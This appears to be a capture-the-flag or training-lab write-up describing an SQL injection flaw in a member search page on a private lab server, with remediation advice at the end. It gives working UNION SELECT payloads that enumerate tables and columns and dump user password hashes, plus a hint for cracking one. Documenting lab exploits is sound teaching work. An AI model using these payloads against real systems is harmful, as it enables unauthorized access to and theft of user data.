# The issue
Forms are not protected against SQL injection enabling us to get access to precious information

## How to reproduce it on the website?
On page http://10.13.0.53/?page=member 

Enter `1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables`
in order to get all the tables.

Enter `1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns` in order to get the columns of tables.

Enter `1 AND 1=2 UNION SELECT Commentaire, countersign  FROM Member_Sql_Injection.users` to get information of the user tables.

You can see this text and just need to apply it:
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

## Why is it a problem?
You can access to the content of the different tables especially to the users.


## How to avoid it?
Use a good framework that prepare accordingly the sql requests.
Be sure to escape correctly special characters. Check for the data given versus the data type expected in the database. 


